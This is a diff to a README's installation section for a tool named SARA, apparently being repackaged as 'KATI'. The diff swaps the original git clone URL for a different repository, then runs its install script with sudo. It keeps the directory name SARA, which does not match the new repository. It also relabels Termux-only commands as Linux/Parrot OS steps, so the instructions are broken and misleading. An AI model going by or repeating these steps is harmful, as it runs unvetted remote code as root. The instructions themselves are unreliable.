@@ -15,15 +15,15 @@ User can customize:
 ### Installation
 Quick installation for Ubuntu, Kali Linux, Darwin (MAC)
 ```bash
-git clone https://github.com/termuxhackers-id/SARA && cd SARA && sudo bash install.sh
+git clone https://github.com/ANON868/kati-by-anon.git && cd SARA && sudo bash install.sh
 ```
 
-Quick installation for Termux Android (ROOT)
+Quick installation for Linux/Parrot Os (ROOT)
 ````bash
 apt-get install tsu git imagemagick python -y && python3 -m pip install Pillow && git clone https://github.com/R1punk/SARA && cd SARA && tsu && bash installtermux.sh && python3 tehsara.py
 ````
 #### KATI for Termux by [@ANON#0001](https://github.com/R1punk/SARA)
-Tutorial on Termux Android [watch here]( STILL FIX)
+Tutorial on linux/parrot os [watch here]( STILL FIX)
 
 ### Dependencies
 - Java
